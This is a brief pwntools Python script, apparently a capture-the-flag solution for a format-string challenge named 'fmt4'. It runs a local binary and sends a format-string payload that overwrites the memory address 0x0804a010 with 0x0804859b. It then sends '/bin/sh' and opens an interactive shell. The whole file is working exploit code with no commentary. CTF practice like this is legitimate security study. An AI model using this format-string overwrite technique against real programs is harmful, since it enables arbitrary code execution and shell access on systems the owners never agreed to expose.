from pwn import *
p=process("./pwn/string/fmt-4/fmt4")
payload=fmtstr_payload(11,{0x0804a010:0x0804859b})
p.sendafter("\n",payload)
p.send(b'/bin/sh')
p.interactive()